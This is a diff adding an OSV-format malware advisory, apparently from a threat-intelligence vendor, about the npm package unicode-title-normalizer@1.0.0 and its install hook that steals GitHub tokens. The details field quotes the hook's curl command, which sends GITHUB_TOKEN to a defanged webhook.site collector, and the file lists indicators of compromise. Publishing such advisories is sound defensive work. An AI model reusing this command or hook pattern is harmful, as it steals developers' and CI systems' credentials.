@@ -1,0 +1,64 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-13117",
+  "modified": "2026-10-20T16:19:54Z",
+  "published": "2026-10-20T16:19:24Z",
+  "summary": "Malicious code in unicode-title-normalizer (npm)",
+  "details": "unicode-title-normalizer@1.0.0 ships an npm `install` lifecycle hook that exfiltrates the installer's GitHub token. The hook runs `echo \"hey hey hey hoooo\" \u0026\u0026 curl hxxps://webhook[.]site/7527749a-4aa3-4727-abb4-fc0ffd8e89ab/workfloou/${{GITHUB_TOKEN}}`, interpolating the value of the GITHUB_TOKEN environment variable directly into the request path so it is recorded by the remote collector. The package itself contains only package.json, a 57-byte index.js and a README — the install hook is its entire functional payload, and it executes automatically on `npm install` in any CI or developer environment where GITHUB_TOKEN is set. Exfiltration endpoint: hxxps://webhook[.]site/7527749a-4aa3-4727-abb4-fc0ffd8e89ab/workfloou/ (token appended as the final path segment).",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "unicode-title-normalizer",
+        "purl": "pkg:npm/unicode-title-normalizer"
+      },
+      "versions": [
+        "1.0.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/unicode-title-normalizer/v/1.0.0"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-13117"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-10-20T16:19:24Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "webhook[.]site"
+        ],
+        "sha256": [
+          "0ca2a83f6815ad479d01157be6a64e8c544e99beccef3b8583c89b4f0422bc6a"
+        ],
+        "url_observed": [
+          "hxxps://webhook[.]site/7527749a-4aa3-4727-abb4-fc0ffd8e89ab/workfloou/"
+        ]
+      }
+    }
+  }
+}
